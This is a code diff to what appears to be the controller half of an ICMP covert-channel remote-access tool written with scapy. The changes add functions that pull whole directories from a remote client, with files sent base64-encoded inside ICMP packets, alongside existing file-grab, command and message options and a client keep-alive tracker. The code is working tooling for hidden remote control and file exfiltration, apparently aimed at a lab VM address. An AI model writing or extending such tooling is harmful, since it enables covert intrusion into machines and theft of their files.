@@ -3,6 +3,7 @@ from threading import Thread
 import base64
 import subprocess
 import time
+import os
 
 sniffInterface = "VMware Network Adapter VMnet8"
 destination = "192.168.18.129"
@@ -14,11 +15,12 @@ def keepAlive():
     while(True):
         #print("[KeepAlive] Kept alive clients : " + str(keptAliveClients)+"\n")
         a = sniff(iface=sniffInterface, filter="icmp", count=1)
-        receivedMessage = a[0][3].fields.get("load").decode("utf-8")
-        if receivedMessage == "keepAlive":
-            src = a[0][1].fields.get("src")
-            #print("[KeepAlive] Added to kept alive "+src+"\n")
-            keptAliveClients[src] = time.time()
+        if len(a[0]) > 2:
+            receivedMessage = a[0][3].fields.get("load").decode("utf-8")
+            if receivedMessage == "keepAlive":
+                src = a[0][1].fields.get("src")
+                #print("[KeepAlive] Added to kept alive "+src+"\n")
+                keptAliveClients[src] = time.time()
 
 def trimKeptAlive():
     while True:
@@ -46,6 +48,46 @@ def sniffMessage():
 def sendMessage(destination, string):
     p = sr1(IP(dst=destination)/ICMP(type=0, id=1, seq=1)/string, timeout=0)
 
+def recvFile(clientPath):
+    print("recvFile | clientPath: "+clientPath)
+    
+    fileName = sniffMessage().decode("utf-8")
+    osFile = os.getcwd() + "/" + fileName.replace(clientPath, "")
+    base64File = sniffMessage()
+
+    print("osFile : "+osFile)
+    print("base64File : "+base64File.decode("utf-8"))
+
+    if not os.path.exists(osFile):
+        with open(osFile, "wb") as fh:
+            fh.write(base64.decodebytes(base64File))
+    else:
+        print("That file already exists ! Consider removing it")
+
+def recvDirectory(clientPath):
+    print("recvDirectory | clientPath: "+clientPath)
+    fileType = sniffMessage().decode("utf-8")
+    
+    while fileType == "file" or fileType == "directory":
+
+        print("fileType: "+fileType)
+        
+        if fileType == "file":
+            recvFile(clientPath)
+        else:
+            path = sniffMessage().decode("utf-8")
+            print("path: " + path)
+            osPath = os.getcwd() + "/" + path.replace(clientPath, "")
+            print("osPath: "+osPath)
+            if not os.path.exists(osPath):
+                os.makedirs(osPath)
+            else:
+                print("That folder already exists ! Consider removing it")
+
+        fileType = sniffMessage().decode("utf-8")
+        
+    print("Finished receiving directory")
+    
 
 if __name__ == "__main__":
     keepAliveThread = Thread(target = keepAlive)
@@ -56,7 +98,7 @@ if __name__ == "__main__":
     
     while True:
 
-        action = input("What should we do ? file | command | message ? ")
+        action = input("What should we do ? file | command | message | directory ? ")
         sendMessage(destination, action)
 
         print("Selected action : "+action)
@@ -66,12 +108,7 @@ if __name__ == "__main__":
             fileName = input("Which file should we get ?\n")
             sendMessage(destination, fileName)
             
-            base64File = sniffMessage()
-
-            print("fileName : "+fileName)
-            print("base64File : "+base64File.decode("utf-8"))
-            with open(fileName, "wb") as fh:
-                fh.write(base64.decodebytes(base64File))
+            recvFile("")
 
         elif action == "command":
             
@@ -89,6 +126,16 @@ if __name__ == "__main__":
             message = input("What message should we send ? ")
             sendMessage(destination, message)
 
+        elif action == "directory":
+            
+            directory = input("Which directory should we get ? ")
+            encodedDirectory = base64.b64encode(directory.encode('utf-8'))
+
+            sendMessage(destination, encodedDirectory)
+            
+            recvDirectory(directory)
+
+            
             
         elif action != "keepAlive":
             print("Received unknown message "+action)
